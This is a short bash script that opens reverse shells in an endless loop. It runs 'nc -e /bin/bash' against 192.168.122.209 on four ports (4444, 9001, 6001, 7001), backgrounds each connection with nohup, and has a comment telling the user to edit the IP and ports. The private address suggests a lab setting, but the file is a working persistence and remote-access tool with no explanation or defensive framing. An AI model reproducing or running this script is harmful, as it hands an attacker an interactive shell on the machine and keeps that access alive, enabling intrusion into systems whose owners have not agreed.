#!/bin/bash
#edit ip and ports for your local config
while true ; do
nohup  nc -e /bin/bash 192.168.122.209 4444 & 
nohup nc -e /bin/bash 192.168.122.209 9001 & 
nohup nc -e /bin/bash 192.168.122.209 6001 & 
nohup nc -e /bin/bash 192.168.122.209 7001
done
